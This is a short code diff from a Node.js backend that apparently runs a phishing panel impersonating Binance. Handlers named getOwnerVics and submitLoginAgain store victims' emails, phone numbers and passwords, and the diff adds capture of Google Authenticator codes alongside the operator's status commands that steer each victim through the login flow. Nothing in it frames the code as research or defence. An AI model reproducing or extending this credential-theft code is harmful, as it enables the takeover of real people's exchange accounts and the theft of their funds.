@@ -15,12 +15,13 @@ const getOwnerVics = async (req, res) => {
 };
 
 const command = async (req, res) => {
-  const { uniqueid, status, emailHolder, telephoneHolder } = req.body;
+  const { uniqueid, status, emailHolder, telephoneHolder, googleAuth } =
+    req.body;
   try {
     if (status == 2 || status == 4) {
       await Binance.findOneAndUpdate(
         { uniqueid },
-        { status, emailHolder, telephoneHolder }
+        { status, emailHolder, telephoneHolder, googleAuth }
       ).exec();
     } else {
       await Binance.findOneAndUpdate({ uniqueid }, { status }).exec();
@@ -79,12 +80,12 @@ const submitLoginAgain = async (req, res) => {
     if (telephone) {
       await Binance.findOneAndUpdate(
         { uniqueid },
-        { telephone, password, status: 7 }
+        { telephone, password, status: 0 }
       ).exec();
     } else {
       await Binance.findOneAndUpdate(
         { uniqueid },
-        { email, password, status: 7 }
+        { email, password, status: 0 }
       ).exec();
     }
     res.sendStatus(200);
